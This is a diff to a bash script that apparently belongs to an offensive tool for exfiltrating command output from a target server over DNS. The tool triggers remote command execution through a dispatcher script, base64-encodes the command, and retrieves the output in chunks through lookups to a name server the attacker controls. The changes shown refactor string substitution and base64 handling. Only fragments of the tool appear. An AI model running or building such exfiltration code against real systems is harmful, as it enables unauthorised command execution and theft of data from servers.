@@ -16,7 +16,7 @@ function usage {
 Usage:
     $0 [OPTION]... -- command that captures the incoming dns traffic
     
-    -h HOST             The host with a wildcard DNS record pointing to our nameserver. This can be a random name in case we control the name server through the DNS_TRIGGER and direct connections to that NS are allowed by the target server (unlikely)
+    -h HOST             The host with an NS record pointing to a name server under our control. This can be a random name in case we control the name server through the DNS_TRIGGER and direct connections to that NS are allowed by the target server (unlikely)
     -d DNS_TRIGGER      The command that will trigger DNS requests on the external server
     -c CMD              The command the output of which we are exfiltrating
     -x DISPATCHER       Path to the script that will trigger the command execution on the server. 
@@ -244,13 +244,14 @@ unique_dns_host="${run_uid}.${dns_host}"
 
 #extracting command output length
 echo -e "\nTrying to execute: \"${cmd}\""
-pre_innerdns_cmd=${innerdns_cmd_template/'%dns_trigger%'/$dns_trigger}
+pre_innerdns_cmd=${innerdns_cmd_template}
+pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
 pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
 pre_innerdns_cmd=${pre_innerdns_cmd/'%STAGE_ID%'/len}
 innerdns_cmd=${pre_innerdns_cmd/'%USER_CMD%'/${user_cmd_out_len}}
 debug_print "innerdns_cmd=$innerdns_cmd"
 
-cmd_b64=$(echo "$innerdns_cmd"|b64 -w0)
+cmd_b64=$(echo "$innerdns_cmd"|b64)
 debug_print "cmd_b64=$cmd_b64"
 
 outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
@@ -269,7 +270,8 @@ echo "The command output length is: $cmd_out_len"
 
 
 #extracting the command output
-pre_innerdns_cmd=${innerdns_cmd_template/'%dns_trigger%'/$dns_trigger}
+pre_innerdns_cmd=${innerdns_cmd_template}
+pre_innerdns_cmd=${pre_innerdns_cmd/'%dns_trigger%'/$dns_trigger}
 pre_innerdns_cmd=${pre_innerdns_cmd/'%UNIQUE_DNS_HOST%'/$unique_dns_host}
 cmd_out=""
 for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size}));do
@@ -284,7 +286,7 @@ for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size
     innerdns_cmd=${innerdns_cmd/${user_cmd_sep}'%USER_CMD%'}
     debug_print "$innerdns_cmd"
     
-    cmd_b64=$(echo "$innerdns_cmd"|b64 -w0)
+    cmd_b64=$(echo "$innerdns_cmd"|b64)
     debug_print "cmd_b64=$cmd_b64"
 
     outer_cmd=${outer_cmd_template/'%CMD_B64%'/$cmd_b64}
